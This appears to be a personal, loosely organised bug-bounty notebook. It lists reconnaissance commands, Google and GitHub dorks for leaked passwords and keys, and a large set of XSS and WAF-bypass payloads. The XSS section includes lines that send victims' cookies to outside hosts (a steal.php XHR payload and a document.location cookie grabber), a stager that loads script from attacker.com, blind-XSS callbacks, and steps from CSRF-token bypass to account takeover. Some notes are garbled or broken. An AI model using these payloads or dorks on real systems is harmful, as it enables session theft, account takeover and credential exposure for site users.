URL encoding. It allows us to put any characters into a URL without breaking the URL    
    example
    http://localhost:8000/?name=%3Cimg%20src=%22https://www.bugcrowd.com/wp-content/uploads/2019/04/bugcrowd-logo.svg%22%3E
    
    extension
    Use Wappalyzer to check CMS or Builtwith or Retire.js or Ghostery ,shodan, knoxss



understand the scope
if small, dont do subdomain analysis, move into appliction analysis 
#check for sharing authentication
complex issue    //login issues been overlooked 

tools to check out
container plugins
paramsfinder
fuff
photon

 $ chmod +x (tool)
how to use files everywhere
# mv (tool) /usr/local/bin
                                                   
   breif summary of my recon
   nmap
  find subdomain
  sort
  parameter
  hidden parameter
  js files 
  dorking google and github
  one linners
  source code look
  old bug resolved


recon with bill  (summary)

githubtesting049@gmail.com


place all the target in burpdsite  

  subfinder



check for languages and framwork used tools -wapplyzer and also server running

    

 whatweb -a 3 (url)
 ping -c 1 (ip)
fping -g (ip)/24  
nmap -PEPM -sP -n (ip)/24 


   PORT SCANNING 
   NMAP 
   nmap (url) -p80, 443 -F -A
   nmpa (url) --top -ports 2000
   nmap url -sV
   nmap url -sV --version -intensity 8
   nmap url -Sv --version - all
    
 check /usr/share/nmap    for SCRIPTS 
 
 nmap url --scripts =http-sql-injection
  nmap url --scripts =firewall-bypass -sw
nmap --scripts "discovery,ftp*,ssh*,http-vuln*,mysql-vuln*,imap-*,pop3-* -il ./nmap_input.txt
masscan -p1-65535 -il  ./dnsprobe_ip.txt -ol ./masscan_output.txt

     NAABU
    naabu -host url -p8080
    
    MAASSCAN
    masscan ip/24 p80, 443
    masscan ip/24 --top -ports
    

Dangerously fast dns/network/port scanner, all-in-one.        check it more  and also not  yet download
skanuvaty --target nmap.org --concurrency 16 --subdomains-file /usr/share/dnsenum/dns.txt       


 theHarvester -d  digitalpacific.com.au -b "anubis, baidu, bing, binaryedge, bingapi, bufferoverun, censys, certspotter, crtsh, dnsdumpster, duckduckgo, fullhunt, github-code, google, hackertarget, hunter, intelx, linkedin, linkedin_links, n45ht, omnisint, otx, pentesttools, projectdiscovery, qwant, rapiddns, rocketreach, securityTrails, spyse, sublist3r, threatcrowd, threatminer, trello, twitter, urlscan, virustotal, yahoo, zoomeye"



Scan each individual IP address associated with their subdomains and having the output saved to a file  &&
CHECK FOR OPEN PORT TOOLS, PORT COMMONLY USED 80, 441, 81   &&
Look for any services running on unusual ports or any service running on default ports which could be vulnerable (FTP, SSH, etc). Look for the version info on services running in order to determine whether anything is outdated and potentially vulnerable



subdomain eneumeration
subfinder 
subfinder -d url - active | tee -a subfinder.txt
subfinder -d google.com -all > subdomain.txt

 sublistr
sublist3r example.com -o output ... $ cat output foo.example.com bar.example.com
 python3 sublist3r.py tesla.com
  python3 sublist3r.py -d tesla.com -b optional 
  
  
   for hidden subdomain 
#From https://github.com/allyshka/vhostbrute
vhostbrute.py --url="example.com" --remoteip="10.1.1.15" --base="www.example.com" --vhosts="vhosts_full.list"
  
  
amass
amass enum -asn -d tesla.com
amass enum [-active] [-ip] -d target
amass enum -d tesla.com | grep target
amass enum -d target.com -o /filepath/subdomains.txt

     
     
     BRUTEFORCE SUBDOMIAN
     KNOCKPY TESLA.COM

    dnsgen  (dns geneartor)
    echo "url" |dnsgen| tee -a subtxt
    
    
    CENsYS
    check for command line tools 
     check for api-key 
     python3 censys-subdomain.py (url)
     Look for SSL certificate:
    
    
    CHAOS  
    CHECK FOR github to get the api-key to run it
    
     
     FILTERING OUT LIVE SUBDOMIN
    Httpx
    cat | grep -E  (url ) | sort -u | tee -u | tee all_url.txt 
 httpx -l subdomains.txt -ports 80,8080,8000,8888 -threads 200 > subdomains_alive.txt
  cat file.txt | httpx -sc
  
  Httprobe 
  check for also the github docs 
  certspotter corp.yahoo.com | httprobe
  httprobe $ cat output.txt | httprobe | tee -a domains
    sort subdomain
   sort -u subdomains.txt | httprobe > /filepath/uniq.txt    
  
  URL RECON - EXTRACTION
  gau
  echo "url" | gau | tee gau.txt
  cat gau.txt | grep ? | tee param.txt    
  gau $mytarget|egrep -iv '\.json'|grep -iE '\.js'|antiburl|awk '{print $4}' | xargs -I %% bash -c 'python3 SecretFinder.py -i %% -o cli -r "$anything"'  // no output, checkmagain later
     
     
     JAVASCRIPTS FILES
     cat param.txt | grep -E *[.]js | tee javascript.txt
     
     
     
           SORTING OUT URL 
      gf check github for help
      cat | gf redirect | tee redirect.txt
     
     
     
     
     check for goSpider github
     Gospider -s (url) --subs --js || tee gospider.txt
     fillter files fron it
     cat url.txt | awk "{print& 3}" | grep -E https:// | tee url.filter.txt
     
     
     FIND PARAMETERS
     PARAMSPIDER 
     Phythn3 paramspider -d tesla.com
     
     ARJUN 
      arjun  --help
     arjun -u tesla.com
     
     
 check  ./cruze         //cruze : a script to automate all the lazy recon flow of the hunter with the tools great people have developed.
 ./cruze.sh example.com
     

      Javascript Enumeration
  
cat domains.txt | waybackurls > urls.txt           or     cat domains.txt | waybackurls > ~/Desktop/urls.txt
 
 pip install jsbeautifier. Then, you run it with js-beautify -o outfile.txt scripts.txt. This will output the file outfile.txt which you can easily browse through.
 
 Now that we have a readable version of all the JavaScript code in one place, I like to start with Grep to get a feel of what I am expecting. The general command is grep --color -i term outfile.txt. You just change the word term with what you’re looking for. For example, try words like secret, admin, password or token to find hardcoded secrets. Alternatively, you can use a path prefix to look for endpoints. Say you noticed that all API endpoints start with /api/v1. In this case, you can substitute the word term in the grep command with /api/v1 to collect all the API endpoints.
 
 
 onliner to extract endpoints from JS files of a given host
 ./js at my kali/scan/
 
 using subjs
 $ cat urls.txt | subjs 
$ subjs -i urls.txt

content discovery/params discovery  for bug hunting

check for  python3 SecretFinder.py


 waybackurls target.com | grep "\\.js"|uniq|sort
 waybackurls target.com | grep "\\.js" | xargs -n1 -I@ curl -k @ | tee -a content.txt        //give me output
                                       $ cat hosts.txt | gau | subjs                     // no output   check later



keywords to look for  in javascript files:pathname url:, POST, api, GET, setRequestHeader, send( (yes with just one (, as it's used when making Ajax requests!. .headers, onreadystatechange, var {xyz} = , getParameter(), parameter, .theirdomain.com, apiKey. and also postMessage, messageListener, .innerHTML, document.write(, document.cookie, location.href, redirectUrl, window.hash.


 getting javasacript files
 source code/developers tools -> search for .js , then copy and paste in vscode and search for all ** word 
 

 WAYBACKURL FOR BUG HUNTING
    waybackurl  (git the github usage)
    echo "url" | waybackurl
    


    waybackmachine
ttps://web.archive.org/web/*/facebook.com/*
.zip
.backup
.config
.csv
.pdf
/api
/admin/
grep "\.txt"
~ "\.log"
~ "\.cache"
~ "\.secret"
~ "\.db"
~ "\.backup"
~ "\.yml"
~ "\.json"
~ "\.gz"
~ "\.rar"
~ "\.zip"
~ "\.config"     

      
      AUTOMATION FOR REPLACING PARAMETERS WITH PAYLOADS
      QSREPLACE (check github for more guidance)
      cat file.txt | qsreplace "<script>alert(1) </script>"  
      
      
      FOOTPRINTING WEBSITES 
      whatweb (url) -v a4
      osint framwork.com
     netcratf.com
     securityheaders.com
     Dnsdumster.com
     whois.com
     mxtoolbox.com
     
     emkel.c2       //// fakemails 
     
     
     
     Directory Bruteforcing / content discovery
     
     dirb tesla.com (wordlist)



gobusster dir -u (url) -w /usr/share/wordlist/dirbuster/directory-list-2.3-medium.txt
gobuster vhost -u (url)  -w /usr/share/wordlist/seclists/Discovery/web-content/directory-list-2.3-medium.txt

fuff -u (url)/fuzz  -w /usr/share/wordlist/dirbuster/directory-list-2.3-medium.txt
 fuff -u (url)/fuzz  -w /usr/share/wordlist/dirbuster/directory-list-2.3-medium.txt ml 200, 301


gobuster vhost -u https://mysite.com -t 50 -w subdomains.txt
gobuster dns -d mysite.com -t 50 -w subdomains.txt

finding files
gobusster dir -u (url) -w /usr/share/wordlist/dirbuster/directory-list-2.3-medium.txt -x,html,css,.js
fuff -u (url)/fuzz  -w /usr/share/wordlist/dirbuster/directory-list-2.3-medium.txt -e .html,.css,.js.conf

Vhost enumeration
fuff -u (url)  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "HOST:FUZZ.EXAMPLE.COM"
gobuster vhost -u (url)  -w /usr/share/wordlist/seclists/Discovery/DNS/subdomains-top1million-20000.txt --append-domain
     
     
     SUBDOMAIN TAKEOVER
     Hostilesubruteforce
     ruby sub-brute.rb
     
     sub404
     python3 sub404.py  -f
     
     subjack

   
 
 
 
./subbrute.py cloudflare.com -o cloudflare.names


 
 ./dnsrecon.py -d securitytrails.com
 

   eyewitness --web -f uniq.txt -d /path_to_save_screenshots  
   


      whoxy.com   //asset discovery  for root domain

Perform reverse DNS lookups on the IP’s you discover through these search engines and see if you can identify IPs, ASN’s, root domains, or other unlinked company owned assets. (shodan , censys, and whoxy.com)


Ports:8443, 8080 Title: "Dashboard[Jenkins]" Product: Tomcat Hostname: example.com Org: google ssl:Google



     SHODAN FOR BUG HUNTING 
     assest discovery using shodan cli                    check nahamesec video on shodan
     
 shodan init api-key
     shodan domain -h
     shodan domain -D url -S
     shodan jq -r '.hostnames' (filename)
     shodan jq -cs '.[0] (filename) | jq -r
     shodan jq -r '.ip_str' (filename) | httpx -titles  -port 443,80,8080              \\ ip address of the domain name
     shodan search org:\"ford motors\" | --fields ip_str, port,http.title
       shodan search org:\"ford motors\" \!port:80,443 | --fields ip_str, port,http.title                     being creative with your search  || \!port:80,443 this means dont show 
       shodan search org:\"ford motors\" \!port:80,443 | --fields ip_str, port,http.title | awk '{print $1, $2 }'  tr " " :"
        shodan search org:\"ford motors\" \!port:80,443 | --fields ip_str, port,http.title | awk '{print $1, $2 }'  tr " " :" | nuclei                         pass to other tools
         shodan search org:\"ford motors\" \!port:80,443 | --fields ip_str, port,http.title | awk '{print $1, $2 }'  tr " " :" | nuclei  | httpx -title -follow-host-redirect   
         
          shodan search search ssl:form.com  --fields ip_str, port,http.title | awk '{print $1, $2}' | tr " " " : "
         shodan search search asn:AS3389  --fields hostnames | tr ";" "\n" | sort -u | domainparser   
          shodan search search asn:AS3389  --fields hostnames | tr ";" "\n" | sort -u | domainparser | sort u | xargs -I{} shodan search ssl:{} -fields ip_str,port
          
          shodan search org:target.com hostnames:localhost
         
     
https://www.shodan.io/search?query=ssl%3A%22Paypal%22

https://www.shodan.io/search?query=ssl%3A%22Paypal%22+200

You can also negative search for specific content you don’t wish to search for by append — in our query followed by the pattern.
https://www.shodan.io/search?query=org%3A%22Amazon%22+ssl%3A%22Paypal%22
https://www.shodan.io/search?query=http.component%3A%22jenkins%22
https://www.shodan.io/search?query=html%3A%22Dashboard+Jenkins%22





Broad domain search w/ negative search
site:example.com -www -shop -share -ir -mfa

 site:example.com intext:password | passcode | intext:username | userid | user | email | credit card | SSN filetype:csv


google dorks

PHP extension w/ parameters
site:example.com ext:php inurl:?

Disclosed XSS and Open Redirects
site:openbugbounty.org inurl:reports intext:"example.com"

Juicy Extensions
site:"example[.]com" ext:log | ext:txt | ext:conf | ext:cnf | ext:ini | ext:env | ext:sh | ext:bak | ext:backup | ext:swp | ext:old | ext:~ | ext:git | ext:svn | ext:htpasswd | ext:htaccess

XSS prone parameters
inurl:q= | inurl:s= | inurl:search= | inurl:query= | inurl:keyword= | inurl:lang= inurl:& site:example.com

Open Redirect prone parameters
inurl:url= | inurl:return= | inurl:next= | inurl:redirect= | inurl:redir= | inurl:ret= | inurl:r2= | inurl:page= inurl:& inurl:http site:example.com

SQLi Prone Parameters
inurl:id= | inurl:pid= | inurl:category= | inurl:cat= | inurl:action= | inurl:sid= | inurl:dir= inurl:& site:example.com

SSRF Prone Parameters
inurl:http | inurl:url= | inurl:path= | inurl:dest= | inurl:html= | inurl:data= | inurl:domain= | inurl:page= inurl:& site:example.com

LFI Prone Parameters
inurl:include | inurl:dir | inurl:detail= | inurl:file= | inurl:folder= | inurl:inc= | inurl:locate= | inurl:doc= | inurl:conf= inurl:& site:example.com

RCE Prone Parameters
inurl:cmd | inurl:exec= | inurl:query= | inurl:code= | inurl:do= | inurl:run= | inurl:read= | inurl:ping= inurl:& site:example.com

High % inurl keywords
inurl:config | inurl:env | inurl:setting | inurl:backup | inurl:admin | inurl:php site:example[.]com

Sensitive Parameters
inurl:email= | inurl:phone= | inurl:password= | inurl:secret= inurl:& site:example[.]com

API Docs
inurl:apidocs | inurl:api-docs | inurl:swagger | inurl:api-explorer site:"example[.]com"

Code Leaks
site:pastebin.com "example.com"

site:jsfiddle.net "example.com"

site:codebeautify.org "example.com"

site:codepen.io "example.com"

Cloud Storage
site:s3.amazonaws.com "example.com"

site:blob.core.windows.net "example.com"

site:googleapis.com "example.com"

site:drive.google.com "example.com"

site:dev.azure.com "example[.]com"

site:onedrive.live.com "example[.]com"

site:digitaloceanspaces.com "example[.]com"

site:sharepoint.com "example[.]com"

site:s3-external-1.amazonaws.com "example[.]com"

site:s3.dualstack.us-east-1.amazonaws.com "example[.]com"

site:dropbox.com/s "example[.]com"

site:box.com/s "example[.]com"

site:docs.google.com inurl:"/d/" "example[.]com"

JFrog Artifactory
site:jfrog.io "example[.]com"

Firebase
site:firebaseio.com "example[.]com"

File upload endpoints
site:example.com ”choose file”

Dorks that work better w/o domain
Bug Bounty programs and Vulnerability Disclosure Programs
"submit vulnerability report" | "powered by bugcrowd" | "powered by hackerone"

Apache Server Status Exposed
site:*/server-status apache

WordPress
inurl:/wp-admin/admin-ajax.php

Drupal
intext:"Powered by" & intext:Drupal & inurl:user

Joomla
site:*/joomla/login





## use WaybackRust        .. a too made with rust 
   waybackrust urls [FLAGS] [OPTIONS] <domain.com or file.txt or stdin>
 waybackrust urls gap.com --output ~/Desktop/file.txt > ~/Desktop/another_file.txt
   

FLAGS:
    -h, --help       Prints help information
    -n, --nocheck    Don't check the HTTP status
    -p, --nocolor    Don't colorize HTTP status
        --silent     Disable informations prints
    -s, --subs       Get subdomains too
    -V, --version    Prints version information
     -b, --blacklist <extensions to blacklist>        The extensions you want to blacklist (ie: -b png,jpg,txt)
    -d, --delay <delay in milliseconds>             
    -o, --output <FILE>
            Name of the file to write the list of urls (default: print on stdout)

    -t, --threads <Number of concurrent requests>    
    -w, --whitelist <extensions to whitelist> 



Github For Recon 

search for token,key, secret, password
search?q={COMPANY_NAME}-&type=Users
"Company name" send_keys or sendkeys
"company.com" "dev"
"dev.company.com"
"company.com" API_key
"company.com" password
"api.company.com" authorization
TIP:
1- check those dorks in github, you will always find somthing interesting 
"Company name" language:python
"Company name" language:bash
2- keep monitoring js files for changes to find new endpoints
3- bruteforce and search for hiddin js files other that whats called in app.

*"target(.)com" password
*"target(.)com" "pass" 'email'
*"target(.)com" "api"
*"target(.)com" FTP
*"target(.)com" SMTP
*"target(.)com" LDAP
*"target(.)com" PEM (For Keys)
Try to remove the (.)com and do the same thing. 
Big domains? Give spaces between them, like "target xyz" and do the 



Perform dirsearch for all subdomains
JSParser -  for reading javascript files
extracting links from JS file LinkFinder(https://github.com/GerbenJavado/LinkFinder) - extracting endpoints from JS files
Check robots.txt page

 END End 

 

 
 
 BOKEN LINK HIJACKING
Manually find and click external links on the target site ( For Example:- Some Links to Social Media Accounts or Some external Media Link)

While Doing Manual work also put broken-link-checker in background using below Command interminal.

blc -rof --filter-level 3 https://example.com/
Ouput will be like Something.
─BROKEN─ https://www.linkedin.com/company/ACME-inc-/ (HTTP_999)
Now you need to check if company has the page or not , if no then register as the company or try to get that username or url.

   BROKEN ACCESS CONTROL
   ALWAYS REPLACE BOTH THE COOKIE AND REFERER OF AN AUTHICATED( ORIGINAL PASSWORD AND USERNAME ) REQUEST INTO AN UNAUTHENCATED (FAKE PASSWORD AND FAKE USERNAME) IN BURP
   
   TEASTE FOR BROWERS CACHE WEAKNESS , this is by loginin and also log out  of you appilcation and then click the browers back botton to verify if you could login




Xss
check for xss cheatsheat


REFLECTED
1)
Use Gau or Wayback urls to passively gather urls of the target.
Filter the parameters using grep "=" or gf patterns and store it in a new file.
Now run Gxss or bxss on that new file.
Check Reflected Param Manually or use some tool like dalfox

ANALYSIS
$cat domains.txt | gau --threads 5 > output.txt                                i think in order to reduce noice, i will stick with in scope url //time shall tell
grep '=' output.txt | grep '&' > filtered_urls.txt     or  grep '=' urls.txt | grep -vE '\.(jpg|png|css|js|ico|gif|...)$' > filtered_urls.txt
       
 cat filtered_url.txt | bxss -appendMode -payload '"><script src=https://hacker.xss.ht></script>' -parameters
     OR
   cat filtered_url.txt | bxss -payload '"><script src=https://z0id.xss.ht></script>' -header "X-Forwarded-For"  or use another payload
   then 
   cat urls.txt | dalfox pipe -f payloads.txt           remember, that the payload.txt is the list of your xss payload in a file
   
   
   
   ALWAYS REMEMBER TO CHANGE ALERT TO PROMPT 
   
  CHECK FOR   BURP SUITE'S DOM INVADER 
   
   
   **Tips***  FOR XSS FIREWALL BYOASS
   Check if the firewall is blocking only lowercase
   examples:     <scRipT>alert(1)</scRipT>
   
   Try to break firewall regex with the new line(\r\n)
   Ex:- <script>%0alert(1)</script>
   
   Try Double Encoding
   Ex:- %2522
   
   Testing for recursive filters, if firewall removes text in red, we will have clear payload
   Ex:- <src<script>ipt>alert(1);</scr</script>ipt>
   
   Injecting anchor tag without whitespaces
    Ex:- <a/href="j&Tab;a&Tab;v&Tab;asc&Tab;ri&Tab;pt:alert&lpar;1&rpar;">
    
    Try to bypass whitespaces using Bullet
    Ex:- <svg•onload=alert(1)>
    
    Try to change request method
    Ex:- GET /?q=xss  POST/ q=xss
    
    Try CRLF Inection
    Ex:- GET /%0A%ODValue=%20Virus
     POST 
     Value= Virus
     
     
     exception marked as on //
     input on text boxes A<h1>A.
     document.location='https://ł.rip/save.php?c='+document.cookie;    this for stealing cookies
     
     
     fastest way to find xss
     
 inject  this  "><script>alert(document.cookie)</script>      into every parameter on every page of the applicetion,  if the attack string appears unmodifiedin the response , that indicates an xss vulnerabilty
     
    
   
2)
Using Burp
Download Reflection and sentinal plugin for burp.
Walk and spider the target site.
Check the reflected params tab in burp
send that sentinal or check manually.

3)
Use Methods 1 or 2 to Gather the urls
Enumerate the Firewall using https://github.com/Ekultek/WhatWaf or other similar tool.
Find WAF bypass payload on twitter by searching or in this Github Repo https://github.com/0xInfection/Awesome-WAF
Also Use Arjun to find hidden params.

4
Find Hidden Variables In Source Code.
Check Javascript file or html Source file for hidden or unused variables
You can Manually Check Right Click View Page Source and search for var= , ="" , =''.
Now Append that to webpage urls. For example https://example.com?hiddenvariablename=xss.

Tips
Check the error pages (404,403,..) sometimes they contain reflected values
Trigger a 403 by trying to get the .htaccess file
Try every reflected parameter


STORED XSS  ARE MOSTLY FOUND MANUALLY
Enumerate the Firewall using above Methods and select a payload to test accordingly.
Try that selected WAF bypass payload while registering on a site in fields like username, name, address, email, etc.
Try Payload in File name of profile picture and also in the source file of image.
Try in Comment section anywhere on target site.
Try on every input fields which get reflected in page and which can be seen by other users.
Try to signup using your name + xss payload and that can lead to stored xss.



ANOTHER TIPS
Open the Contact Support endpoint (https://example.com/contact?submitted=false)
Inject the XSS payload in any field and Submit the form
You will be redirected to the Thank you Page at (https://example.com/contact?submitted=true )
Open the Contact Support endpoint again at (https://example.com/contact?submitted=false)
You will find the XSS alert :)
    shorter way
Open the contact support endpoint (https://example.com/contact?submitted=false)
Inject the XSS payload in any field BUT enter anything wrong or leave any required field missing in the form and then Submit the form.
You will find the XSS alert :)


another TIP 
Create an account with an XSS payload in the First Name field using an email that you own, (e.g.: attacker@gmail.com)
log in to your previously created account while intercepting the login request, and remove the XSS payload from the firstName parameter of the second request.
Go to the created Account Settings and change the email to another email that you also own (e.g.: attacker+1@gmail.com)
You will receive a confirmation email on attacker@gmail.cominforming you that your email has been changed.
Open the confirmation email and click on View web version to access the vulnerable XSS URL.
Copy that vulnerable XSS URL and send it to the victim.


chatgpt explanation

Inject XSS Payload:

Injected an XSS payload into the "First Name" field during account sign-up.
Encounter Access Issue:

Encountered a "403 Forbidden" error when attempting to log in.
Analyze Login Requests:

Used Burp Suite to intercept login requests and discovered two POST requests.
Identify the Problem:

Suspected the XSS payload in the "firstName" parameter of the second request was causing the issue.
Resolve Self-XSS:

Removed the XSS payload from the second request, successfully logged in, and noticed a Self-XSS alert.
Exploit the Vulnerability:

Explored account settings and found the ability to change the email address.
Email Confirmation:

Changed the email address to another owned address and received a confirmation email at the original email.
Trigger XSS via Email:

Clicked "View web version" in the email, triggering the XSS alert.
Share the Vulnerability:

Obtained a URL that triggered the XSS alert and could be shared with others.



my explaination
create a account and first login in clearly on the first request
on the second request, Create an account with an XSS payload in the First Name field using an email that you own, (e.g.: attacker@gmail.com)
log in to your previously first  created account while intercepting the login request,    remove the XSS payload from the firstName parameter of the second request.
Go to the  second created Account Settings and change the email to another email that you also own (e.g.: attacker+1@gmail.com)
Open the confirmation email and click on View web version to access the vulnerable XSS URL.



///////////
Bug Bounty Tip

HTML entities can help you bypass WAF filters

1) bypass block of single quote '
?url=home%26apos;-alert(1)//
onclick="location='/home&apos;-alert(1)//'"

2) bypass block of colon :
?url=javascript%26colon;alert(1)
href="javascript&colon;alert(1)"

analysis 
************TIP******
inject  <a href=#>test</a>  in every  Input fields such as  text boxes, text areas, drop-down lists, checkboxes, radio buttons, and more.
and then trry to obfuscated payods
FOR WAF BYPASS for STORED xss
 
wheere payload  is <script>alert('XSS')</script>  // check for more strong xss payloads and run the following encode payload //  use chapgpt to genearte encoding payloads
encode payload

XSS polygot
jaVasCript:/*-/*`/*`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>x3csVg/<sVg/oNloAd=alert()//>x3e

      basic xss filter bypass
      1) using ann html img tag instead of script
      2)when alert is blocked, prompt can be used ...  alert (1) to prompt(1)
      3) backtrick can be used when bracket is filter ....  alert(1) to alert`1`  or use alert(String.fromCharCode(88,83,83)) when string are blocked
      
      
      

 CLOUDFLARE BYPASS [XSS]
PAYLOAD:
<Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))> 
 - <img src=x on0x=1 onerror=alert(document.cookie)>






🌐ColdFusion  XSS
POC:
{{host}}/CFIDE/debug/cf_debugFr.cfm?userPage=javascript:alert(document.domain)


  Here's a small #XSS list for manual testing (main cases, high success rate).
"><img src onerror=alert(1)>
"autofocus onfocus=alert(1)//
</script><script>alert(1)</script>
'-alert(1)-'
\'-alert(1)//
javascript:alert(1)
    
    Sucuri bypass payload 
<s\Cr\ipt\>alert(document\.cookie)<\/s\Cr\ipt\>\;\/>

some browers tolearate extra bracket
  <<script>alert(10);//<</scripts>

using invalid tags
<x onclick=alert(1) src=a>click here </x>


beating the lenght limit  example
  https://mypaa.com/account.php?page_id="><script>/*&seed=*/alert(document.cookie);/*&mode=*</script>
  

 
       Email 

“><svg/onload=confirm(1)>”@gmail.com     
  "><svg/onload=confirm(1)>"@x.y 
  test+(<script>alert(document.domain)</script>)@gmail.com
just try this payload:
test@gmail.com%27\%22%3E%3Csvg/onload=alert(/xss/)%3E
  
      
      

url encoding of payload 


`%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%27%58%53%53%27%29%3C%2F%73%63%72%69%70%74%3E`    

Hex encoding of payload
`\x3C\x73\x63\x72\x69\x70\x74\x3E\x61\x6C\x65\x72\x74\x28\x27\x58\x53\x53\x27\x29\x3C\x2F\x73\x63\x72\x69\x70\x74\x3E`

BASE 64
PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=

unicode encodng
\u003C\u0073\u0063\u0072\u0069\u0070\u0074\u003E\u0061\u006C\u0065\u0072\u0074\u0028\u0027\u0058\u0053\u0053\u0027\u0029\u003C\u002F\u0073\u0063\u0072\u0069\u0070\u0074\u003E


USING COMBINATION OF ALL TECHNIQUES

URL Encoding + Hex Encoding:


Base64 Encoding + Unicode Encoding:  and 

combination of all technique 


Blind XSS
Use burpcollaborator or ngrok

1- Review forms
2- Contact Us pages
3- Passwords(You never know if the other side doesn’t properly handle input and if your password is in View mode)
4- Address fields of e-commerce sites
5- First or Last Name field while doing Credit Card Payments
6- Set User-Agent to a Blind XSS payload. You can do that easily from a proxy such as Burpsuite.
7- Log Viewers
8- Feedback Page
9- Chat Applications
10- Any app that requires user moderation

            DOM XSS
Tips
Would not recommend manually looking for DOM XSS
Burp suite PRO scanner can find DOM XSS
Tool: https://github.com/dpnishant/ra2-dom-xss-scanner

www.gap.com/email?message=<script>alert("hi")</script>

     
     Tips to find DOM XSS: ⚡️🔥
 never use source while testing for dom xss
1. Start Burpsuite Community Edition 
2. Click on Open Browser 
3. Go and click on the Burp icon in extension tab on browser 
4. Click on Turn on DOM Invader 
5. Inject a custom canary 
6. Open target website, right click, Inspect and go to Invader
7. Now Click on Inject URL or Inject Form
8. Check Reflection of canary
9. If all goes well, You will see the green exploit button
10. Click it to get Dom XSS poc 
11. If doesn’t work, repeat the same on different url, functionality. 

/////////
 if string enters in double qoute, we might break out by using double qoute
 REMEMBER
 if you data get url- encoded before being processed, it is unlikely an xss will work

   


///
eval(alert(document.domain))
location.hash       https://oldnavy.gap.com/#test          change the string ? to # if empty
location.search   .... place a random value into it
  example
  https://www.gogle.com/submit.thml?email=sdddhhhd
  it would return ?email=sdddhhhd

window.location.hash.slice(1)

   /#<iframe src="www.google.com" onload="this src+='<img src=1 onerror=alert(1)"'>
 
     


    idea (someone) for finding xss
amass enum -d target.com -o /filepath/subdomains.txt
 sort -u subdomains.txt | httprobe > /filepath/uniq.txt
 eyewitness --web -f uniq.txt -d /path_to_save_screenshots

 It took few minutes and after that I just wrote a simple script to embed those png screenshots with html so that I can view them directly in my browser.
for I in $(ls); do 
        echo "$I" >> index.html;
        echo "<img src=$I><br>" >> index.html;
done
  I used paramspider to extract the parameters of that subdomain
 paramspider -d target.com > /filepath/param.txt
 dalfox -b hahwul.xss.ht file param.txt

        
        use the browerser console to alwys poop out and check payload on a given page 
  including long payloads/ escalation of xss beyond alert box
  <script src="http://nw.rs"></script>
  getScript("http://nw.rs",function(){});    this is by using jquery 
  
 Note //  if you are exploiting an XSS on a page that uses HTTPS, you will need to pull the XSS payload from a link that also uses HTTPS, otherwise the browser will refuse to load it with a “Mixed Content” error. because of cors 
 
 Bypassing CSRF Tokens //
 by loading the form within an iframe. If the page is loaded within an iframe, then the form will automatically include the CSRF token within the form, 
 
 once we bypass sop and csrf token then ACCOUNT TAKEOVER 
 
 Change the user’s password
Change the user’s email address or phone number to our own, and then use the forgot password functionality to update their password
Change the user’s security questions

 // the shortest payload I know of that does not pull an external script is 20 characters long  it is used when there is less than 20 character string     <svg/onload=alert()>
 
 
 session hijacking payload  on an form 
 <script>
var sessionId = document.



ie.match(/sessionId=(.*?)(;|$)/)[1]
</script>

payload for a data theft using xss

<script>
var stolenCookies = document.cookie;
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://yourserver.com/steal.php?data=' + encodeURIComponent(stolenCookies), true);
xhr.send();
</script>


($$ \unicode{<img src=1 onerror=alert(1)>} $$) 





Pay careful attention to where your injection takes place. 
For example, a clothing store may have a filter to show only shirts in the color blue. Added to the URL could be something along the lines of /?s=color_blue.

Often times the first instinct is to inject by replacing everything after the =. Try replacing only the portion reflected on that page or the parameter you're looking to filter. Example /?s=color_<script>alert()</script>.

Another injection point may be entering the payload after the filter like the example in these images. Example /?s=color_blue<script>alert()</script>


   lesser known payload   /replace video with music, or image
<video onerror="alert(1)">


This payload puts a twist on requiring user interaction. By injecting a style tag, we manipulate the size of the HTML tag to be the size of the screen. Any mouse movement on the page will pop the alert.
   1"%20onmouseover="alert(document.domain)"%20style="position%3Aabsolute;%20top%3A0;%



        /?search=<IMG%20SRC=1%20onmouseover=alert()>             USING CASE SENSETIVE
        
        
        
        running 404 page example
        
        conduct a subdomain enumeration using tools such as Subfinder, Amass, and crt.sh.
        performed a DNS brute force, resulting in the discovery of nearly 40,000 subdomains. 
        running HTTPX on these subdomains, Ito identified  2,500 live and active ones.
        check for active subdomain painstakly
        
         encountering the 403 Error,  decide to test whether if it is  a global restriction affecting all pages or specific to the main page by providing the subdomain with a dummy path.
         example  = rplicense.redacted.com/dummy
         
         After inputting the dummy path, the 403 status code might  transformed into a 404 Not Found, indicating that the 403 code was exclusive to the main web page and not applicable to every        c    conceivable path. At this point, commenced fuzzing the web application using ffuf along with a wordlist named raft-large. 
      Here’s the command:   
      ffuf -u "rplicense.redacted.com/FUZZ" -w /path/to/word-list -H "User-Agent: Mozilla/5.0 (Galaxy S22; Android 6) AppleWebKit/537.48 (KHTML, like Gecko) Chrome/111.0.5628.105 Mobile Safari/537.48" -  rate 20  also fuzz achive/directory and check for forms and sumit payload where neccasry
 



  WEAPONING XSS
  
NOTE: WHEN having a simple XSS in alert form But when we attempted to demonstrate its impact or leverage it beyond an alert we have nothing! Thankfully, if you find yourself in this situation, you can write a compact XSS stager with 98 characters using the following JavaScript syntax (note, you could save a few more characters by registering a shorter domain name and using an index page):   
  <svg/onload=body.appendChild(document.createElement`script`).src='https://attacker.com/p' hidden/>
  
 NOTE:  when injecting an  XSS payload let say we excute the alert(1)” payload, and the page got empty we notice something is wrong in the background. Some of the page is missing... So why can’t we access it? The problem is with our injection point; where it is in the page. If you're injecting code before an element you need to access, you first need to wait for the DOM to finish being built before your code executes. This is because the page is built "top-to-bottom" and in this case our payload is injected into the “To” field which comes before the "csrf" token field. As such the “csrf” element does not yet exist at the time of execution as the DOM hasn’t finished being built! This is why some elements are missing when we execute an alert.
  
To compensate for this, you can attach an event listener to the document which will trigger your code once the DOM has completed its loading process. As ever, there are multiple ways to do this but the “by design” event for handling this is called “DOMContentLoaded”, and can be used as follows:

  ?name="><script>document.addEventListener("DOMContentLoaded",()=>alert(csrf.value))</script><link/rel="
  
